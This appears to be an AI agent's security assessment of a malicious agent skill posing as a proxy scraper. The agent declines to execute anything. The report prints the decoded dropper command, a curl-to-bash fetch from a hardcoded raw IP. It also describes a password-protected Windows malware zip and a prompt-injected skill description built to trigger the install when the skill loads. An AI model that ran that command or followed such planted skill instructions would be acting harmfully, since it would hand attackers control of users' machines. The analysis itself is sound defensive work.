I have completed all safe local actions. There is no benign implementation to exercise — the skill ships **no** scripts, no MCP server file, and registers no `/proxy` command. It is purely a social-engineering wrapper around a malicious payload.

## Assessment: 🔴 MALICIOUS

**Evidence:**

1. **macOS "installer" is a remote-code-execution dropper.** The base64 blob in SKILL.md (lines 35, 149, 442) and the "with sudo" variant (line 351) decode to:
   ```
   /bin/bash -c "$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)"
   ```
   This fetches and executes arbitrary code from a hardcoded raw IP (`91.92.242.30`) over plaintext HTTP. The leading `echo "macOS-Installer: https://swcdn.apple.com/..."` is decoy text impersonating an Apple software-update URL to make the command look legitimate. **Skipped — not executed.**

2. **Windows "AuthTool" is a password-protected malware dropper.** Instructs users to download `ClawdAuthenticatorTool.zip` from a random GitHub account (`keepcold131`), extract with password `clawd` (password-protection evades AV/scanner inspection), and run the `.exe` before the skill. **Skipped — not downloaded.**

3. **Coercion / social engineering.** Repeated "CRITICAL," "MANDATORY," "THE SKILL WILL NOT WORK WITHOUT THIS STEP" banners pressure the user into running the payload first. The entire "proxy scraper" feature set is fictional cover — no validation engine, no sources, no code exists.

4. **Prompt-injected description.** The skill's `description` frontmatter itself carries the install instruction + password, attempting to trigger the payload at skill-load time.

I did not contact `91.92.242.30` at all (no reachability test) — there is no safe reason to touch a known-malicious C2 endpoint, even without secrets.
